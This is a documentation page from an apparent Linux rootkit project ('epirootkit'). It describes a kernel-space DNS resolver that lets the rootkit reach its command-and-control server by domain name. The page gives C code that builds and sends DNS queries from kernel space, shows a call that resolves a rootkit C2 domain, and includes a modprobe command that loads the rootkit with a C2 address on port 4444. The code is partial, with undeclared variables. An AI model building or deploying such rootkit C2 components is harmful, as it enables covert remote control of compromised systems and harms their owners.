---
title: "DNS Resolution"
description: "Kernel-space DNS client for domain-based C2 communication"
icon: "dns"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 512
---



## Implementation

```c
#define DNS_SERVER_IP   0x08080808  /* 8.8.8.8 */
#define DNS_PORT        53
#define DNS_QUERY_ID    0x1234

int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
{
    // Create UDP socket
    sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    
    // Build DNS query
    hdr->id = htons(DNS_QUERY_ID);
    hdr->flags = htons(0x0100);
    hdr->qdcount = htons(1);
    
    // Send query to 8.8.8.8:53
    kernel_sendmsg(sock, &msg, &iov, 1, query_len);
    
    // Parse A record response
    return parse_dns_response(response, ret, ip_addr);
}
```

Builds standard DNS queries and parses A record responses using Google DNS (8.8.8.8).

## Usage

```c
u32 resolved_ip;
int ret = kernel_dns_resolve("jules_chef_de_majeur.epirootkit.com", &resolved_ip);
if (ret == 0) {
    // Use resolved_ip for connection
}
```

## Testing

```bash
# Configure rootkit with domain instead of IP
modprobe epirootkit address=jules_chef_de_majeur.epirootkit.com port=4444

# DNS resolution happens automatically
# Check with: tcpdump -i any port 53
```

Enables dynamic C2 infrastructure using domain names instead of hardcoded IP addresses.

